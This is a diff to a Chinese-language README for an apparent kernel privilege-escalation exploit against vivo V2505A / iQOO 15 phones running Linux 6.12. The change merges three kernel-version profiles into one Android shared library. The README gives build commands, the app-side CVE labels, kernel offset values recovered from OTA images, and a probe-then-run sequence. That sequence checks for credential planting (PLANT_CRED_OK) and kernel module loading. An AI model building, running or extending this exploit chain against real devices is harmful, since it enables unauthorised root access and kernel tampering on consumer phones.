@@ -6,8 +6,14 @@
 
 ## 状态
 
-常量已从 iQOO 15 新 OS6 全量 OTA 的 `boot.img` 内核 Image 静态恢复，并用镜像
+常量已从 iQOO 15 OS6/OS7 全量 OTA 的 `boot.img` 内核 Image 静态恢复，并用镜像
 自带的 `.BTF` 校验了结构布局。**尚需真机验证**：先跑只读 `probe`，再跑完整 `run`。
+
+## 单一 .so
+
+V2505A 三个 6.12 profile（6.12.23 / 6.12.58 OS6 / 6.12.58 OS7）现在共用一个
+`libv2505a.so`：C 侧 `v2505a_multi` 运行时表按完整 `uname -r` 选择常量；
+App 的三个精确标签都映射到同一个 so。旧的 OS6/OS7 独立 so 已移除。
 
 ## OTA 来源与提取
 
@@ -181,35 +187,33 @@ BTF/共享尺寸与 OS6 相同：k_itimer 0x100、task_struct 0x1440、`task->cr
 
 ```bash
 cd exploit/rust-t61269
-cargo build --release --target aarch64-linux-android --features v2505a_61258
+cargo build --release --target aarch64-linux-android --features v2505a_multi
 cp target/aarch64-linux-android/release/t61269 \
-   ../../app/app/src/main/jniLibs/arm64-v8a/libv2505a_61258.so
-
-cargo build --release --target aarch64-linux-android --features v2505a_61258_os7
-cp target/aarch64-linux-android/release/t61269 \
-   ../../app/app/src/main/jniLibs/arm64-v8a/libv2505a_61258_os7.so
+   ../../app/app/src/main/jniLibs/arm64-v8a/libv2505a.so
 ```
 
-`build.rs` 分别追加 `-DV2505A_61258` / `-DV2505A_61258_OS7`，
-`Cargo.toml` 对应 `v2505a_61258 = []` / `v2505a_61258_os7 = []`。
+`build.rs` 追加 `-DV2505A_MULTI`，`Cargo.toml` 对应
+`v2505a_multi = []`。三套 profile 的常量在 C 侧运行时表里；旧
+`v2505a` / `v2505a_61258` / `v2505a_61258_os7` feature 保留作单 profile
+构建参考，App 不再使用。
 
 ## App 侧
 
-- `ExploitKind.CVE2505A_61258("CVE-2026-98260-vivo-V2505A-6.12.58")`，按完整
-  OS6 release 精确选中；入口 `libv2505a_61258.so`
-- `ExploitKind.CVE2505A_61258_OS7("CVE-2026-98260-vivo-V2505A-6.12.58-OS7")`，
-  按完整 OS7 release 精确选中；入口 `libv2505a_61258_os7.so`
-- 旧的 6.12.23 V2505A 入口保留，按各自完整内核版本选择
+- `ExploitKind.CVE2505A` / `CVE2505A_61258` / `CVE2505A_61258_OS7` 三个精确
+  release 标签都映射到同一个 `libv2505a.so`
+- `libv2505a.so` 由 `v2505a_multi` 构建，`auto_preflight` 按完整 `uname -r`
+  选 profile；不匹配则 `kernel mismatch`
 - SUSFS / Dynamic Switching 与旧 V2505A 一致；VFS 仍只对 6.18 开放
 
 ## 验证顺序
 
-1. 只读自检：
-   - OS6：`libv2505a_61258.so probe` → `low21=0x117cb8` / `0x18da1c`
-   - OS7：`libv2505a_61258_os7.so probe` → `low21=0x1173e4` / `0x1f2218`
-   - 两者都期望 `PROBE_SLIDE ... aligned=1`、`PROBE_LINEAR_MAP`、`PROBE_CRED`、
+1. 只读自检：`libv2505a.so probe`，由 `uname -r` 自动选 profile：
+   - 6.12.23：`low21=0x1e0890` / `0x0cfd98`
+   - 6.12.58 OS6：`low21=0x117cb8` / `0x18da1c`
+   - 6.12.58 OS7：`low21=0x1173e4` / `0x1f2218`
+   - 都期望 `PROBE_SLIDE ... aligned=1`、`PROBE_LINEAR_MAP`、`PROBE_CRED`、
      `PROBE_VR_TRACEPOINT=0x... funcs=0x... off=0x48`、`PROBE_OK`
-2. 完整链路：对应 `.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` /
+2. 完整链路：`libv2505a.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` /
    `MODULE_LOADED`
 3. 冷重启后再跑一次；再验证 SUSFS 与 Dynamic Switching
 4. 失败一律留 holder（`t61269-hold`），**同 boot 不要强行重跑**，冷重启再试
